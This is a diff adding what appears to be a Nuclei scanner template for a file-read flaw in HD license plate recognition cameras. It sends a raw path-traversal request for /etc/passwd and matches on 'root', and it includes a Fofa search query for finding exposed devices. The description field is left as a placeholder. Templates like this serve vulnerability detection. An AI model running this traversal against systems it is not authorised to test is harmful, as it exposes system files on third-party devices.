@@ -1,0 +1,30 @@
+id: HD_license_plate_recognition_camera_Fileread
+
+info:
+  name: HD_license_plate_recognition_camera_Fileread
+  author: HK
+  severity: high
+  description: write your description here
+  metadata:
+    max-request: 1
+    Fofa-query: title="高清车牌识别摄像机"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - root
